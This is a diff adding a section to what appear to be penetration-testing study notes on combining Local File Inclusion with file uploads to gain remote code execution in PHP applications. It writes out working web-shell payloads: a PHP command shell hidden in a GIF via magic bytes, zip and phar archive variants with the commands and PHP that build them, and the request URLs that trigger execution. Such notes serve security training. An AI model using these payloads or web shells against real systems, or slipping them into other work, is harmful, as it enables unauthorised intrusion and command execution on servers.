@@ -306,3 +306,93 @@ To exploit RFI for code execution, attackers typically:
 - **Default Settings**:
   - RFI is often disabled in modern configurations for security reasons (e.g., `allow_url_include` set to `Off` by default in PHP).
   - SMB exploitation may require the attacker to be on the same network if the server restricts remote access.
+
+---
+
+# Local File Inclusion (LFI) and File Uploads
+
+## Overview
+File upload functionalities are common in modern web applications, enabling users to upload personal data. Attackers can exploit file upload forms in combination with Local File Inclusion (LFI) vulnerabilities to achieve **Remote Code Execution (RCE)**.
+
+### Key Idea
+- The file upload functionality doesn't need to be vulnerable—merely allowing file uploads is sufficient.
+- Code Execution occurs when the uploaded file is included and executed by the LFI vulnerability.
+
+
+## Image Upload Exploitation
+
+### Crafting a Malicious Image
+- Create an image file with allowed file extensions (e.g., `.gif`) containing malicious code.
+- Include **magic bytes** (e.g., `GIF8`) at the file's start to bypass content-type validation:
+  ```bash
+  $ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+  ```
+
+### Uploading the Image
+- Upload the malicious image (e.g., via profile avatar upload):
+  ```
+  http://<SERVER_IP>:<PORT>/settings.php
+  ```
+
+### Identifying the Uploaded File Path
+- Inspect the uploaded file's path from its URL or HTML source:
+  ```html
+  <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+  ```
+
+### Triggering the LFI Vulnerability
+- Include the uploaded file via the vulnerable function to execute the embedded PHP code:
+  ```
+  http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+  ```
+
+### Note
+- Use `../` if the vulnerable function prefixes directories before input (e.g., `../../profile_images/shell.gif`).
+
+
+## Alternative Techniques
+
+### Zip Upload
+#### Overview
+The **zip wrapper** can be used to execute PHP code embedded within a zip archive.
+
+#### Steps:
+1. Create a malicious PHP file and compress it into a zip archive:
+   ```bash
+   $ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+   ```
+2. Upload the archive.
+3. Include the file using the `zip://` wrapper:
+   ```
+   http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+   ```
+
+#### Note
+- Zip archives may be blocked by content-type validation unless allowed by the upload functionality.
+
+
+### Phar Upload
+#### Overview
+The **phar wrapper** can execute PHP code from a phar file.
+
+#### Steps:
+1. Create a PHP script to generate a phar archive:
+   ```php
+   <?php
+   $phar = new Phar('shell.phar');
+   $phar->startBuffering();
+   $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+   $phar->setStub('<?php __HALT_COMPILER(); ?>');
+   $phar->stopBuffering();
+   ```
+2. Compile it and rename it with an image extension:
+   ```bash
+   $ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+   ```
+3. Upload the phar file.
+4. Include it using the `phar://` wrapper:
+   ```
+   http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+   ```
+
+---
